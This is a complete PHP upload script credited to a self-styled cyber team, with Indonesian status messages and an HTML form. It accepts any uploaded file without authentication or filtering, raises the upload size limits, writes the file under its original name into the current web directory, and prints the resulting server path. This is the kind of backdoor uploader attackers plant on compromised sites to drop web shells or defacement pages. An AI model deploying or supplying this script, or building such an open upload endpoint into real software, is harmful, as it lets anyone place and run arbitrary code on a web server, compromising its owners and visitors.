<?php

//Create By Mr.7Mind & Imammrtdho
//Credits By ribelcyberteam@gmail.com
//Tele @RibelCyberTeam
//No Rename Please

ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');

$status = "Error Masse";
$cwd = getcwd();
$leader = $_FILES["ribel"]['size'];
$imam = $_FILES["ribel"]['type'];
$ribel = $_FILES["ribel"]['name'];
$status = "";

if ($ribel != "") {
    $cyber = $ribel;
    if (copy($_FILES['ribel']['tmp_name'], $cyber)) {
        $status = "File Berhasil Diupload Masse: <br>" . $cwd . "/" . $ribel;
    } else {
        $status = "Terjadi Kesalahan Saat Mengupload File Masse";
    }
} else {
    $status = "Silahkan Pilih Filenya Dulu Masse";
}
echo $status;
?>

<html>
<head>
</head>
<body>
<form action="" method="POST" enctype="multipart/form-data">
<input type="file" name="ribel">
<input type="submit" name="submit" value="Gass Masse">
</form>
</body>
</html>
